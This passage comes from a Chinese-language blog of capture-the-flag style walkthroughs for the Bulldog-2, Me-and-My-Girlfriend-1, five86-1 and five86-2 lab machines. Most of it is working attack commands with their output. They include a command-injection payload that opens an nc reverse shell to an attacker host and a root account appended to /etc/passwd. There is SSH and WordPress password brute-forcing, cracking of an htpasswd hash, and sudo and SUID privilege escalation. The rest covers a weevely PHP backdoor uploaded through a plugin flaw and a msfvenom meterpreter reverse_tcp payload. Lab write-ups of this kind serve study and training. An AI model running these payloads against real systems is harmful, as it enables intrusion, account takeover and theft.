&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:284:7 at Function.process_params (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12) at next (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:275:10) at initialize (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;initialize.js:53:5) at Layer.handle [as handle_request] (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) 在github上找到&quot;Bulldog-2-The-Reckoning&quot;的源码 https://github.com/Frichetten/Bulldog-2-The-Reckoning 在/router/users.js中发现存在exec函数 12345678exec(&#96;linkplus -u $&#123;username&#125; -p $&#123;password&#125;&#96;, (error, stdout, stderr) &#x3D;&gt; &#123;if (error) &#123; console.error(&#96;exec error: $&#123;error&#125;&#96;); return;&#125;console.log(&#96;stdout: $&#123;stdout&#125;&#96;);console.log(&#96;stderr: $&#123;stderr&#125;&#96;);&#125;); 可以在admin中的登入点实现命令注入 监听端口 nc -lvvp 2020 反弹Shell 1234&#123; &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;bash -i 2&gt;&amp;1|nc 192.168.31.10 2020 &gt;&#x2F;tmp&#x2F;f&quot;&#125; 成功接收Shell 权限提升 查看文件/etc/passwd的权限 123ls -l &#x2F;etc&#x2F;passwd -rwxrwxrwx 1 root root 1790 Feb 20 12:09 &#x2F;etc&#x2F;passwd /etc/passwd可写 构造账户信息并写入/etc/passwd 1234567openssl passwd -6 hackforfun $6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1echo &#39;test::$6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1:0:0:toor:&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwdsu toorhackforfunid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) JWT JWT提权时有些迷 直接修改数据而不修改签名 提权成功 数据与签名都修改 提权成功 直接删掉签名部分 提权失败 jwtcrack破解6位纯小写密码在虚拟机中大概需要3min。 参考资料 JWT /etc/passwd WP WP Me-and-My-Girlfriend-1 2020/03/04 13:23:34 端口扫描 nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.164 12345678910111213141516171819202122232425Nmap scan report for 192.168.31.164Host is up (0.0015s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)| 2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)| 256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)|_ 256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.7 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text&#x2F;html).MAC Address: 08:00:27:06:D9:59 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Uptime guess: 0.002 days (since Wed Mar 4 00:21:12 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;256 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Web路径枚举 dirb http://192.168.31.233/ -w 123456---- Scanning URL: http:&#x2F;&#x2F;192.168.31.164&#x2F; ----&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.164&#x2F;config&#x2F; + http:&#x2F;&#x2F;192.168.31.164&#x2F;index.php (CODE:200|SIZE:120) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.164&#x2F;misc&#x2F; + http:&#x2F;&#x2F;192.168.31.164&#x2F;robots.txt (CODE:200|SIZE:32) + http:&#x2F;&#x2F;192.168.31.164&#x2F;server-status (CODE:403|SIZE:294) 访问/： Who are you? Hacker? Sorry This Site Can Only Be Accessed local! 访问robots.txt： 12User-Agent: *Allow: &#x2F;heyhoo.txt 访问/heyhoo.txt：Great! What you need now is reconn, attack and got the shell 漏洞利用 使用hackbar进行操作 添加HTTP Header: X-Forwarded-For: 0.0.0.0 请求/之后发现页面无变化，而浏览器路径变成/?page=index 再次请求/?page=index，则显示正常页面 个人推测是仿造IP请求/之后，触发302跳转至?page=index，而跳转之后的请求进行伪造IP，所以需要进行两步操作。包括之后的请求都要先点击链接，导入hackbar，在hackbar中请求。 在register页面中注册一个用户 随后login 这两步推荐在BurpSuite中操作 HTTP Header加上X-Forwarded-For: 0.0.0.0即可 成功登入之后路径为/index.php?page=dashboard&amp;user_id=12 而进入profile之后可以在源码中查看当前用户名与密码 更改user_id参数，即可未授权访问其他用户的profile页面 将所获取的账户与密码写入文件，再添加两个常用词 12345678910111213141516cat diceweuhtandinganskuyatuhaingmaungqwerty!!!sundateaindONEsiasedihaingmahcedihhihihialice4lic3abdikasepakdorrrrradminroot 利用hydra对SSH服务进行爆破 12hydra -I -L dic -P dic -v -e ns ssh:&#x2F;&#x2F;192.168.31.164 [22][ssh] host: 192.168.31.164 login: alice password: 4lic3 成功获取账户 权限提升 12ssh alice@192.168.31.164 4lic3 查看sudo权限 1234567sudo -lMatching Defaults entries for alice on gfriEND: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser alice may run the following commands on gfriEND: (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;php 用sudo权限使用php来进行提权 123sudo php -r &quot;system(&#39;&#x2F;bin&#x2F;bash&#39;);&quot;id uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) 密码共用 值得一提的是，除了WEB服务中alice账户可以用于登入SSH服务之外，数据库的密码(/var/www/html/config/config.php)也是root用户的口令。进行靶机渗透时经常会出现这种状况，当获取到一些账户时，不妨试着在后台运行一下hydra。现实中这种情况也很常见，虽然理想状态下每个密码都足够复杂而且各不相同，但终将只是理想状态罢了。 Mysql 渗透过程中也尝试过针对user_id参数进行SQL注入，但是也没有进展，回过头想一下nmap扫描端口时并未发现Mysql服务。后来在网上看了一下，mysql可以设置为仅本地访问(localhost/127.0.0.1/0.0.0.0)。 sudo 之前对于sudo的理解还是不够透彻，仅仅单纯地以为sudo权限就是sudo -i直接提root，或者sudo接命令，片面地认为sudo权限是在账号层面上的。实则可以更为细化，如让账户可以以sudo权限执行某些命令。 参考资料 sudo wp mysql five86-1 2020/03/08 18:20:27 端口扫描 nmap -p 1-65535 -Pn -T5 -sV -A -n -v 192.168.31.209 12345678910111213141516171819202122232425262728293031Nmap scan report for 192.168.31.209Host is up (0.00033s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey: | 2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)| 256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)|_ 256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.38 ((Debian))| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD| http-robots.txt: 1 disallowed entry |_&#x2F;ona|_http-server-header: Apache&#x2F;2.4.38 (Debian)|_http-title: Site doesn&#39;t have a title (text&#x2F;html).10000&#x2F;tcp open http MiniServ 1.920 (Webmin httpd)|_http-favicon: Unknown favicon MD5: 6E79CCAA5DCB1FD29C6A7C795BBD608E| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Site doesn&#39;t have a title (text&#x2F;html; Charset&#x3D;iso-8859-1).MAC Address: 08:00:27:D8:1F:90 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Uptime guess: 7.882 days (since Sat Feb 29 08:12:28 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Web路径枚举 dirb http://192.168.31.209/ -w 12345---- Scanning URL: http:&#x2F;&#x2F;192.168.31.209&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.209&#x2F;index.html (CODE:200|SIZE:30) + http:&#x2F;&#x2F;192.168.31.209&#x2F;reports (CODE:401|SIZE:461) + http:&#x2F;&#x2F;192.168.31.209&#x2F;robots.txt (CODE:200|SIZE:29) + http:&#x2F;&#x2F;192.168.31.209&#x2F;server-status (CODE:403|SIZE:279) /reports路径需要进行basic认证 访问/robots.txt，得到如下内容 12User-agent: *Disallow: &#x2F;ona 路径/ona下运行的是&quot;opennetadmin v18.1.1&quot; 10000端口上的webmin服务需要账户 漏洞利用 opennetadmin存在RCE漏洞 1234searchsploit opennetadminOpenNetAdmin 13.03.01 - Remote Code Execution | exploits&#x2F;php&#x2F;webapps&#x2F;26682.txtOpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | exploits&#x2F;php&#x2F;webapps&#x2F;47772.rbOpenNetAdmin 18.1.1 - Remote Code Execution | exploits&#x2F;php&#x2F;webapps&#x2F;47691.sh webmin存在RCE漏洞但是需要提供账户 在MSF中使用ona的RCE漏洞利用模块 1234use exploit&#x2F;linux&#x2F;http&#x2F;opennetadmin_ping_cmd_injectionset RHOST 192.168.31.209set LHOST 192.168.31.10run 获取shell 当时MSF在kali源上的最新版本为5.0.76，而github上已更新到5.0.79，而且该RCE漏洞模块是在5.0.77版本加入MSF，所以需要手动将漏洞模块导入MSF，详情见下文 权限提升 查看文件/var/www/html/reports/.htaccess 123456cat &#x2F;var&#x2F;www&#x2F;html&#x2F;reports&#x2F;.htaccessAuthType BasicAuthName &quot;Restricted Area&quot;AuthUserFile &#x2F;var&#x2F;www&#x2F;.htpasswdrequire valid-user 查看文件/var/www/.htpasswd 123456cat &#x2F;var&#x2F;www&#x2F;.htpasswd douglas:$apr1$9fgG&#x2F;hiM$BtsL9qpNHUlylaLxk81qY1# To make things slightly less painful (a standard dictionary will likely fail),# use the following character set for this 10 character password: aefhrt 得到账户douglas的密码hash与密码的相关信息 由字符aefhrt组成 长度为十位 将hash保存到本地 echo 'douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1' &gt; passwd 使用crunch构造字典 crunch 10 10 aefhrt -o pass 使用john爆破hash 123john --wordlist&#x3D;pass --format&#x3D;md5crypt passwdjohn --show passwd douglas:fatherrrrr 使用douglas账户登入目标主机 12ssh douglas:192.168.31.206fatherrrrr 查看sudo权限 1234567sudo -lMatching Defaults entries for douglas on five86-1: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;binUser douglas may run the following commands on five86-1: (jen) NOPASSWD: &#x2F;bin&#x2F;cp 可以以用户jen身份执行cp命令 生成ssh秘钥，拷贝至jen账户的home目录中，切换至账户jen 1234ssh-keygen -t rsa -C &quot;jen@127.0.0.1&quot;cp &#x2F;home&#x2F;douglas&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;tmp&#x2F;authorized_keyssudo -u jen cp &#x2F;tmp&#x2F;authorized_keys &#x2F;home&#x2F;jen&#x2F;.ssh&#x2F;authorized_keysssh jen@127.0.0.1 登入信息中得到提示 1You have new mail. 查看邮件 1234567891011121314151617181920212223242526272829cat &#x2F;var&#x2F;mail&#x2F;jenFrom roy@five86-1 Wed Jan 01 03:17:00 2020Return-path: &lt;roy@five86-1&gt;Envelope-to: jen@five86-1Delivery-date: Wed, 01 Jan 2020 03:17:00 -0500Received: from roy by five86-1 with local (Exim 4.92) (envelope-from &lt;roy@five86-1&gt;) id 1imZBc-0001FU-El for jen@five86-1; Wed, 01 Jan 2020 03:17:00 -0500To: jen@five86-1Subject: Monday MossMIME-Version: 1.0Content-Type: text&#x2F;plain; charset&#x3D;&quot;UTF-8&quot;Content-Transfer-Encoding: 8bitMessage-Id: &lt;E1imZBc-0001FU-El@five86-1&gt;From: Roy Trenneman &lt;roy@five86-1&gt;Date: Wed, 01 Jan 2020 03:17:00 -0500Hi Jen,As you know, I&#39;ll be on the &quot;customer service&quot; course on Monday due to that incident on Level 4 with the accounts people.But anyway, I had to change Moss&#39;s password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!Moss will understand (ha ha ha ha).Tanks,Roy 获得账户moss的密码 切换至账户moss 12su mossFire!Fire! 在路径/home/moss下发现隐藏文件夹.game 进入文件夹.game之后发现存在一个root权限的文件upyourgame 123456789101112131415161718ls -latotal 28drwx------ 2 moss moss 4096 Jan 1 03:53 .drwx------ 3 moss moss 4096 Jan 1 23:05 ..lrwxrwxrwx 1 moss moss 21 Jan 1 03:21 battlestar -&gt; &#x2F;usr&#x2F;games&#x2F;battlestarlrwxrwxrwx 1 moss moss 14 Jan 1 03:23 bcd -&gt; &#x2F;usr&#x2F;games&#x2F;bcdlrwxrwxrwx 1 moss moss 21 Jan 1 03:21 bombardier -&gt; &#x2F;usr&#x2F;games&#x2F;bombardierlrwxrwxrwx 1 moss moss 17 Jan 1 03:22 empire -&gt; &#x2F;usr&#x2F;games&#x2F;empirelrwxrwxrwx 1 moss moss 20 Jan 1 03:23 freesweep -&gt; &#x2F;usr&#x2F;games&#x2F;freesweeplrwxrwxrwx 1 moss moss 15 Jan 1 03:23 hunt -&gt; &#x2F;usr&#x2F;games&#x2F;huntlrwxrwxrwx 1 moss moss 20 Jan 1 03:22 ninvaders -&gt; &#x2F;usr&#x2F;games&#x2F;ninvaderslrwxrwxrwx 1 moss moss 17 Jan 1 03:19 nsnake -&gt; &#x2F;usr&#x2F;games&#x2F;nsnakelrwxrwxrwx 1 moss moss 25 Jan 1 03:21 pacman4console -&gt; &#x2F;usr&#x2F;games&#x2F;pacman4consolelrwxrwxrwx 1 moss moss 17 Jan 1 03:22 petris -&gt; &#x2F;usr&#x2F;games&#x2F;petrislrwxrwxrwx 1 moss moss 16 Jan 1 03:22 snake -&gt; &#x2F;usr&#x2F;games&#x2F;snakelrwxrwxrwx 1 moss moss 17 Jan 1 03:20 sudoku -&gt; &#x2F;usr&#x2F;games&#x2F;sudoku-rwsr-xr-x 1 root root 16824 Jan 1 03:52 upyourgamelrwxrwxrwx 1 moss moss 16 Jan 1 03:22 worms -&gt; &#x2F;usr&#x2F;games&#x2F;worms 执行之后任意输入五次即可进入root权限下的sh 1234567891011121314.&#x2F;upyourgame Would you like to play a game? 1Could you please repeat that? 1Nope, you&#39;ll need to enter that again. 1You entered: No. Is this correct? 1We appear to have a problem? Do we have a problem? 1Made in Britain.# iduid&#x3D;0(root) gid&#x3D;1001(moss) groups&#x3D;1001(moss) 手动导入MSF模块 searchsploit命令找到了存储于本地的MSF漏洞利用模块，其路径为 /usr/share/exploitdb/exploits/linux/webapps/47772.rb 执行如下命令即可 12cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;webapps&#x2F;47772.rb &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;exploits&#x2F;linux&#x2F;http&#x2F;opennetadmin_ping_cmd_injection.rbchmod 644 opennetadmin_ping_cmd_injection.rb.rb 之后在MSF中执行reload_all cp提权 之前看到有文章大概列举了一下SUID提权的几个指令，其中有cp命令，但是没有文章没有列举出详细的操作过程 个人想法是用root权限的cp命令去覆盖掉passwd文件，这次靶机渗透学到了用cp命令去写入ssh信任秘钥来进行水平提权 大概不能将同样的套路用于垂直提权至root，因为一般ssh默认禁止掉了root登入 参考资料 WP five86-2 2020/03/15 21:54:23 端口扫描 nmap -p 1-65535 -Pn -T5 -sV -A -n -v 192.168.31.209 123456789101112131415161718192021Nmap scan report for 192.168.31.51Host is up (0.00044s latency).Not shown: 65532 filtered portsPORT STATE SERVICE VERSION21&#x2F;tcp open ftp ProFTPD 1.3.5e80&#x2F;tcp open ssl&#x2F;http Apache&#x2F;2.4.41 (Ubuntu)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http:&#x2F;&#x2F;192.168.31.51&#x2F;MAC Address: 08:00:27:29:D0:EB (Oracle VirtualBox virtual NIC)Device type: general purpose|storage-misc|WAP|media deviceRunning (JUST GUESSING): Linux 2.6.X|3.X|4.X (95%), HP embedded (91%), Netgear RAIDiator 4.X (91%), Ubiquiti AirOS 5.X (90%), ZyXEL embedded (90%), Ubiquiti embedded (90%)OS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6 cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;h:hp:p2000_g3 cpe:&#x2F;o:netgear:raidiator:4.2.24 cpe:&#x2F;o:ubnt:airos:5.2.6 cpe:&#x2F;o:linux:linux_kernel:2.6.32 cpe:&#x2F;h:ubnt:airmax_nanostationAggressive OS guesses: Linux 2.6.32 - 3.13 (95%), Linux 2.6.22 - 2.6.36 (93%), Linux 2.6.32 - 2.6.39 (93%), Linux 2.6.37 (93%), Linux 3.10 - 4.11 (93%), Linux 2.6.39 (93%), Linux 2.6.32 (92%), Linux 3.2 - 4.9 (92%), Linux 2.6.32 - 3.10 (92%), HP P2000 G3 NAS device (91%)No exact OS matches for host (test conditions non-ideal).Uptime guess: 32.468 days (since Tue Feb 11 09:55:14 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Unix Web路径枚举 dirb http://192.168.31.51/ -w 1234567---- Scanning URL: http:&#x2F;&#x2F;192.168.31.51&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.51&#x2F;index.php (CODE:301|SIZE:0) + http:&#x2F;&#x2F;192.168.31.51&#x2F;server-status (CODE:403|SIZE:278) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-admin&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-content&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-includes&#x2F; + http:&#x2F;&#x2F;192.168.31.51&#x2F;xmlrpc.php (CODE:405|SIZE:42) 80端口上仅存在Wordpress服务框架 漏洞利用 未找到FTP服务版本相关漏洞 Wordpress深入信息收集 未挖掘出有漏洞的插件或主题 用户枚举 wpscan --url http://192.168.31.51/ -e u 12345678910111213141516[i] User(s) Identified:[+] admin | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] barney | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] gillian | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] peter | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] stephen | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) 构造用户字典文件 1234567cat userbarneyadmingillianpeterstephen 尝试进行账户爆破 wpscan --url http://192.168.31.51/ -U user -P /usr/share/wordlists/rockyou.txt 得到两个账户 12barney spooky1stephen apollo1 在/wp-login.php登入 登入之后在Plugins面板看到存在插件 Insert or Embed Articulate Content into WordPress Trial 搜索相关信息 123456789searchsploit Insert or Embed Articulate Content into WordPress------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)------------------------------------------------------------------------------------------- ----------------------------------------WordPress Plugin Insert or Embed Articulate Content into WordPress - Remote Code Execution | exploits&#x2F;php&#x2F;webapps&#x2F;46981.txt------------------------------------------------------------------------------------------- ----------------------------------------Shellcodes: No Result 再查看漏洞的具体利用步骤 cat /usr/share/exploitdb/exploits/php/webapps/46981.txt 使用weevely构造php后门并创建一个文件index.html，压缩成zip文件 123weevely generate pass &gt; shell.phpecho &gt; index.htmlzip poc.zip index.html shell.php 登入wordpress(已登入) 依次点击Posts -&gt; Add New -&gt; Add block -&gt; e-Learning -&gt; UPLOAD -&gt; CHOOES YOUR ZIP FILE -&gt; poc.zip -&gt; UPLOAD! -&gt; Insert As: iFrame -&gt; INSERT 此时会显示出index.html的路径，复制之后将index.html改为shell.php即为后门路径 连接后门 weevely http://five86-2/wp-content/uploads/articulate_uploads/poc/shell.php pass 权限提升 查看系统信息 12uname -aLinux five86-2 5.3.0-26-generic #28-Ubuntu SMP Wed Dec 18 05:37:46 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux 构造meterpreter后门程序 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9990 -f elf &gt; msf.elf 在MSF中开启监听 12345use exploit&#x2F;multi&#x2F;handler set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp set LHOST 192.168.31.10set LPORT 9990run 在weevely中上传后门程序并启动(需要填写绝对路径) 1234file_upload &#x2F;root&#x2F;software&#x2F;msf.elf &#x2F;var&#x2F;www&#x2F;html&#x2F;msf.elfcd &#x2F;var&#x2F;www&#x2F;htmlchmod +x msf.elf.&#x2F;msf.elf 在meterpreter的shell中获取tty 12shellpython3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 查看文件/etc/passwd 12345678910111213141516171819202122232425262728293031323334353637383940414243cat &#x2F;etc&#x2F;passwdroot:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashdaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologinmessagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinsyslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinuuidd:x:106:111::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologintcpdump:x:107:112::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinlandscape:x:108:114::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologinpollinate:x:109:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;falsesshd:x:110:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologinlxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;falsemysql:x:111:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;falsebarney:x:1001:1001:Barney Sumner:&#x2F;home&#x2F;barney:&#x2F;bin&#x2F;bashstephen:x:1002:1002:Stephen Morris:&#x2F;home&#x2F;stephen:&#x2F;bin&#x2F;bashpeter:x:1003:1003:Peter Hook:&#x2F;home&#x2F;peter:&#x2F;bin&#x2F;bashgillian:x:1004:1004:Gillian Gilbert:&#x2F;home&#x2F;gillian:&#x2F;bin&#x2F;bashrichard:x:1005:1005:Richard Starkey:&#x2F;home&#x2F;richard:&#x2F;bin&#x2F;bashpaul:x:1006:1006:Paul McCartney:&#x2F;home&#x2F;paul:&#x2F;bin&#x2F;bashjohn:x:1007:1007:John Lennon:&#x2F;home&#x2F;john:&#x2F;bin&#x2F;bashgeorge:x:1008:1008:George Harrison:&#x2F;home&#x2F;george:&#x2F;bin&#x2F;bashdnsmasq:x:114:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin 存在用户barney和stephen 尝试套用Wordpress账户的密码 可以登入账户stephen 12su stephenapollo1 查看当前用户信息 12iduid&#x3D;1002(stephen) gid&#x3D;1002(stephen) groups&#x3D;1002(stephen),1009(pcap) 查看特权命令 1234567getcap -r &#x2F; 2&gt; &#x2F;dev&#x2F;null&#x2F;usr&#x2F;bin&#x2F;ping &#x3D; cap_net_raw+ep&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils &#x3D; cap_net_raw+ep&#x2F;usr&#x2F;bin&#x2F;mtr-packet &#x3D; cap_net_raw+ep&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;gstreamer1.0&#x2F;gstreamer-1.0&#x2F;gst-ptp-helper &#x3D; cap_net_bind_service,cap_net_admin+ep&#x2F;usr&#x2F;sbin&#x2F;tcpdump &#x3D; cap_net_admin,cap_net_raw+eip 发现存在tcpdump程序，可以用于监听流量 查看程序tcpdump所有者与所有组 12ls -l &#x2F;usr&#x2F;sbin&#x2F;tcpdump-rwxr-x--- 1 root pcap 1044232 Oct 11 18:48 &#x2F;usr&#x2F;sbin&#x2F;tcpdump 而用户stephen也属于pcap组，可以使用tcpdump程序 查看系统关于ftp的进程 12345678ps -aux | grep ftpsystemd+ 1251 0.0 0.3 119976 1876 pts&#x2F;0 Ss+ 10:21 0:01 proftpd: (accepting connections)paul 2329 0.0 0.1 2600 788 ? Ss 12:00 0:00 &#x2F;bin&#x2F;sh -c &#x2F;home&#x2F;paul&#x2F;ftp_upload.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1paul 2330 0.0 0.1 2600 788 ? S 12:00 0:00 &#x2F;bin&#x2F;sh &#x2F;home&#x2F;paul&#x2F;ftp_upload.shpaul 2331 